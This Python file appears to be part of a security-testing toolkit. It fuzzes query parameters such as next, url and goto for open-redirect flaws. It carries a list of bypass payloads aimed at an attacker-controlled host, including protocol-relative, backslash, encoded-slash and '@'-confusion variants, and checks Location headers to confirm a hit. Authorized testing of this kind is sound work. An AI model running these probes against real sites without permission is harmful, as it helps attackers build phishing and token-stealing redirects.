#!/usr/bin/env python3
"""open_redirect_hunt.py — generic parametric open-redirect fuzzer.

Confirmed gap: scanner.sh only mkdir's findings/redirects/ and lists "redirects"
in DEFAULT_SKIP_SET with zero actual probing logic; oauth_tester.py only covers
OAuth redirect_uri, not generic ?next=/?url=/?return=/?goto= params. Confirms
ONLY via a real Location header to the attacker-controlled host — a redirect
back to the app's own domain is not a finding, regardless of status code.
"""
from __future__ import annotations

from dataclasses import dataclass
from urllib.parse import urlsplit, parse_qs, urlparse

_REDIRECT_PARAM_NAMES = {
    "next", "url", "return", "return_to", "returnto", "redirect", "redirect_uri",
    "redirecturl", "goto", "continue", "dest", "destination", "u", "r", "target",
}


def extract_redirect_params(url: str) -> list[str]:
    """Query-param names on url that look like a redirect target."""
    query = parse_qs(urlsplit(url).query)
    return [name for name in query if name.lower() in _REDIRECT_PARAM_NAMES]


def build_bypass_variants(attacker_host: str) -> list[str]:
    """Common open-redirect bypass encodings for a given attacker-controlled host."""
    return [
        f"https://{attacker_host}",
        f"http://{attacker_host}",
        f"//{attacker_host}",
        f"/\\/{attacker_host}",
        f"https:/{attacker_host}",
        f"https:%2F%2F{attacker_host}",
        f"https://example.com@{attacker_host}",
        f"https://example.com.{attacker_host}",
    ]


@dataclass
class RedirectResult:
    confirmed: bool
    location: str = ""


def probe_url(client, url: str, param: str, attacker_host: str) -> RedirectResult:
    """Replace param's value with each bypass variant; confirm the first variant
    whose Location header actually points at attacker_host."""
    for variant in build_bypass_variants(attacker_host):
        parsed = urlsplit(url)
        query = parse_qs(parsed.query)
        query[param] = [variant]
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()

        response = client.get(test_url, allow_redirects=False)
        if response.status_code not in (301, 302, 303, 307, 308):
            continue
        location = dict(response.headers).get("Location", "")
        if not location:
            continue
        location_host = urlparse(location).netloc
        if location_host == attacker_host or location_host.endswith("." + attacker_host):
            return RedirectResult(confirmed=True, location=location)
    return RedirectResult(confirmed=False)
